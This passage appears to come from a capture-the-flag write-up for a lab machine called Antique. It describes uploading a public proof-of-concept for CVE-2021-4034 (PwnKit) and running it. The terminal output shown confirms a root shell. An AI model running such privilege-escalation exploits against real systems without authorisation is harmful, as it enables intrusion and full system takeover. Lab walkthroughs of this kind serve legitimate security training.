@@ -1,0 +1,1 @@
+load a POC exploit (I like this one from Joe Ammond ), and upload it to Antique. From there, it’s as simple as running the script: lp@antique:/dev/shm$ python3 CVE-2021-4034.py [+] Creating shared library for exploit code. [+] Calling execve() # id uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)
